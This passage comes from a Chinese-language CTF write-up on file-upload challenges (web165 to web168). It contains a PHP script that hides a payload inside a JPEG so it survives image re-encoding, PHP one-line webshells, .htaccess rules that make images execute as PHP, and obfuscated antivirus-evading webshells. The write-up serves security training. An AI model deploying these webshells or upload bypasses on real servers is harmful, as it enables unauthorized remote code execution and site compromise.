</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">==</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$marker</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">skip</span><span class="p">(</span><span class="nv">$size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$marker</span> <span class="o">===</span> <span class="mh">0xDA</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$startPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$outStreamTmp</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$miniPayload</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStreamTmp</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$extraBytes</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">===</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span> <span class="o">!==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$stopPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$imageStreamSize</span> <span class="o">=</span> <span class="nv">$stopPos</span> <span class="o">-</span> <span class="nv">$startPos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$outStream</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$miniPayload</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">substr</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">,</span> <span class="nv">$imageStreamSize</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$nullbytePayloadSize</span><span class="o">+</span><span class="nv">$imageStreamSize</span><span class="o">-</span><span class="nv">$extraBytes</span><span class="p">)</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$stopPos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$correctImage</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$outStream</span> <span class="o">=</span> <span class="nv">$outStreamTmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStream</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Something\&#39;s wrong&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">checkImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$unlink</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$unlink</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">custom_error_handler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="p">,</span> <span class="nv">$errline</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$extraBytes</span><span class="p">,</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DataInputStream</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$binData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$fromString</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span> <span class="o">=</span> <span class="nv">$order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fromString</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">-</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">skip</span><span class="p">(</span><span class="nv">$skip</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="nv">$skip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">readByte</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$byte</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$byte</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">readShort</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$short</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$short</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">eof</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="o">||</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行成功后会生成<strong>payload_1.jpg</strong></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png" title="image-20230728012935422" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728012935422.png 2x"
            sizes="auto"
            alt="image-20230728012935422">
    </a></figure></p>
<p>上传后可搭配bp抓包实现命令执行</p>
<h3 id="web166" class="headerLink">
    <a href="#web166" class="header-mark"></a>[web166]</h3><p>只能上传zip，那我们就上传一个一句话的zip文件，然后用蚁剑连接</p>
<p>新建一个zip文件，后面插入一句话木马</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要注意的是<code>Content-Type</code>为<code>application/x-zip-compressed</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png" title="image-20230728020642046" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020642046.png 2x"
            sizes="auto"
            alt="image-20230728020642046">
    </a></figure></p>
<p>可以用蚁剑直接连接<code>http://28bac684-221f-4841-8c98-b81c4f551965.challenge.ctf.show:8080/upload/download.php?file=de9373c30bd8d73705a6d44209947715.zip</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png" title="image-20230728020601373" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728020601373.png 2x"
            sizes="auto"
            alt="image-20230728020601373">
    </a></figure></p>
<h3 id="web167" class="headerLink">
    <a href="#web167" class="header-mark"></a>[web167]</h3><p>根据提示上传了包含shell的jpg文件,上传成功,点击下载文件,发现没有存在文件包含点,访问upload检查是否有可执行文件,提示没有权限,但是发现中间件是Apache</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png" title="image-20230728103941301" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png 2x"
            sizes="auto"
            alt="image-20230728103941301">
    </a></figure></p>
<p>.htaccess文件中写入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddType application/x-httpd-php .jpg
</span></span><span class="line"><span class="cl">&lt;!-将jpg文件按照php文件解析--&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>或者写入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Sethandler application/x-httpd-php
</span></span><span class="line"><span class="cl">&lt;!-将该目录及子目录下的文件均按照php文件解析执行--&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过改包文件后缀名的方式上传.htaccess</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png" title="image-20230728105548335" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105548335.png 2x"
            sizes="auto"
            alt="image-20230728105548335">
    </a></figure></p>
<p>随后上传带有一句话木马的jpg文件
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png" title="image-20230728105902636" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728105902636.png 2x"
            sizes="auto"
            alt="image-20230728105902636">
    </a></figure></p>
<p>hackbar命令执行或者蚁剑连接</p>
<h3 id="web168" class="headerLink">
    <a href="#web168" class="header-mark"></a>[web168]</h3><p>png改包为php，但需要免杀马</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#39;bw==&#39;).base64_decode(&#39;bQ==&#39;).base64_decode(&#39;ZQ==&#39;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#39;YQ==&#39;).base64_decode(&#39;bA==&#39;).chr(060340/01154).chr(01041-0775).base64_decode(&#39;cw==&#39;).str_rot13(&#39;b&#39;).chr(01504-01327).base64_decode(&#39;ZQ==&#39;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#39;NjgxO&#39;.&#39;Tc7QG&#39;.&#39;V2QWw&#39;.&#39;oJF9Q&#39;.&#39;&#39;.str_rot13(&#39;G&#39;).str_rot13(&#39;1&#39;).str_rot13(&#39;A&#39;).base64_decode(&#39;VQ==&#39;).str_rot13(&#39;J&#39;).&#39;&#39;.&#39;&#39;.chr(0x304-0x2d3).base64_decode(&#39;Ug==&#39;).chr(13197/249).str_rot13(&#39;F&#39;).base64_decode(&#39;MQ==&#39;).&#39;&#39;.&#39;B1bnR&#39;.&#39;VXSk7&#39;.&#39;MjA0N&#39;.&#39;TkxOw&#39;.&#39;==&#39;.&#39;&#39;));?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>蚁剑连接<code>*****/upload/1.php</code></p>
<p>密码<code>TyKPuntU</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png" title="image-20230728120650152" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728120650152.png 2x"
            sizes="auto"
            alt="image-20230728120650152">
    </a></figure></p>
<p>还有其他的免杀马：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;s#y#s#t#e#m&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;#&#34;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nv">$b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nv">$b</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="nv">$b</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="nv">$b</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="nv">$b</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>再如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
